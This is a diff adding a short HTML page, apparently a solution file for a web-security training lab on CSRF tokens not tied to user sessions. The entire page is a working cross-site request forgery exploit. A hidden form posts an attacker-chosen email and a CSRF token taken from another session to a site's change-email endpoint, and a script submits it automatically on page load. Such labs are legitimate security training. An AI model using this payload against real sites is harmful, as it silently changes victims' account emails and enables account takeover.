@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Lab: CSRF where token is not tied to user session
+        </title>
+    </head>
+    <body>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post" id="form-exploit">
+            <input type="text" name="email" value="abcd@normal-user.net">
+            <input type="hidden" name="csrf" value="VALID OBTAINED CSRF TOKEN">
+            <input type="submit">
+        </form>
+    </body>
+    <script>
+        document.getElementById('form-exploit').submit()
+    </script>
+</html>
